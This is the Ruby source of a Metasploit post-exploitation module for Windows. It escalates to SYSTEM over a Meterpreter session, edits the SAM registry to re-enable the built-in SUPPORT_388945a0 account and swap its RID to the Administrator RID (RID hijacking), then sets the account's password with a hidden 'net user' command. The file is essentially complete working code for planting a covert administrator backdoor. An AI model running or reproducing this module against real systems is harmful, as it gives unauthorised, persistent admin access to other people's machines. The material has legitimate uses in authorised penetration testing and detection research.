require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post
	def initialize(info={})
                super( update_info( info,
                                'Name'          => 'Windows Manage - Trojanize support account on servers/workstations',
                                'Description'   => %q{
                                                	This module enables alternative access to servers and workstations
							by modifying the support account's properties. It will enable 
							the account for remote access as the administrator user while
							taking advantage of some weird behavior in lusrmgr.msc. It will
							check if sufficient privileges are available for registry operations,
							otherwis it exits. More info at: http://xangosec.blogspot.com         
                                        },
                                'License'       => MSF_LICENSE,
                                'Author'        => 'salcho <salchoman[at]gmail.com>',
                                'Platform'      => [ 'win' ],
                                'SessionTypes'  => [ 'meterpreter' ]
                        ))
                register_options(
                        [
                                OptString.new('PASSWORD',  [true, 'Password of the support user account', 'password']),
                                OptBool.new('GETSYSTEM',   [true,  'Attempt to get SYSTEM privilege on the target host.', true])
                        ], self.class)
        end

	def run
		if (session.sys.config.getuid() !~ /SYSTEM/ and datastore['GETSYSTEM'])
                        res = session.priv.getsystem
			if !res[0]
				print_error("You need to run this script as system!")
				return
			else
				print_good("Got system!")
			end
		end

		sysnfo = session.sys.config.sysinfo
		print_status("Target OS is #{sysnfo["OS"]}")
		names_key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SAM\SAM\Domains\Account\Users\Names', KEY_READ)
		if not names_key
			print_error("Couldn't access registry keys")
			return
		end

		rid = -1
		print_status('Harvesting users...')
		names_key.enum_key.each do |name|
			if name =~ /SUPPORT_388945a0/
				print_good("Found #{name} account!")
				skey = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\Names\\#{name}", KEY_READ)
				if not skey
					print_error("Couldn't open user's key")
					return
				end
				rid = skey.query_value("").type
				print_status("Target RID is #{rid}")
				skey.close
			end
		end
		names_key.close

		if rid != -1
			users_key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SAM\\SAM\\Domains\\Account\\Users', KEY_READ)
			users_key.enum_key.each do |r|
				next if r == 'Names'
				if r.to_i(16) == rid
					u_key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\#{r}", KEY_READ)
					f = u_key.query_value("F").data
					if f[0x38].unpack("H*")[0].to_i == 11
						print_status("Account is disabled, activating...")
						f[0x38] = ["10"].pack("H")
					else
						print_error("Target account is already enabled")
					end

					print_good("Swapping RIDs...!")
					f[0x30, 2] = ["f401"].pack(">H*")
					u_key.close
					
					open_key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\#{r}", KEY_WRITE)
					open_key.set_value("F", session.sys.registry.type2str("REG_BINARY"), f)
					open_key.close
				
					print_good("Setting password to #{datastore['PASSWORD']}")
					chan = session.sys.process.execute("cmd.exe /c net user support_388945a0 #{datastore['PASSWORD']}", nil, {'Hidden' => true, 'Channelized' => true})
					while(d = chan.channel.read)
						print_status("\t#{d}")
					end
				end
			end
		
		else
			print_error("Couldn't get user's RID...")
			return
		end
	end










	end
